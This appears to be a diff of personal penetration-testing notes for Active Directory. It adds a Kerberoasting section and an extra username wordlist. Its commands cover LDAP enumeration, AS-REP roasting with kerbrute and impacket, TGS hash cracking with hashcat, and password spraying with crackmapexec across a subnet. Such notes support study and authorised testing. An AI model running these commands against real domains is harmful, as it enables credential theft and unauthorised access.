@@ -40,13 +40,21 @@ ldapsearch -h <IP> -x -b “DC=cascade,DC=local” ‘(objectClass=person)’
 ```
 ## AS-REP Roasting (Authentication Reply Roasting)
 1. If pre-authentication is disabled, and we provide a list of userlists to the domain controller (AS-REQ), the DC will grant us TGT. If the passwords are weak, we can crack the TGT and gain access. We can use krebrute, impacket, or crackmap
-2. If we dont find some misconfiguration or user name try using this username list `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
-3. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
-4. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
-5. Crack the hash
+2. If we dont find some misconfiguration or user name try using this username list `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` 
+3. or `https://github.com/jeanphorn/wordlist/blob/master/usernames.txt` for the below command
+4. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
+5. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
+6. Crack the hash
 ## After initial shell, credentials or some password
 1. Enumerate the initial target using powerview. Trasfer file to target.
 2. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+## Kerbreroasting
+1. Once we have creds, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
+```
+impacket-GetUserSPNs <IP or hostname>/<username>:<password> [add -request if SPN is found]
+[save hash and crack with hashcat]
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+```
 ## Pass the Password Attack
 1. Lets say we have some credentials. Lets try to pass the password/hash to other connected networks. 
 2. `crackmapexec 192.168.119.0/24 -u SOMEUSERNAME -d DOMAIN.LOCAL -p SOMEPASSWORD` 
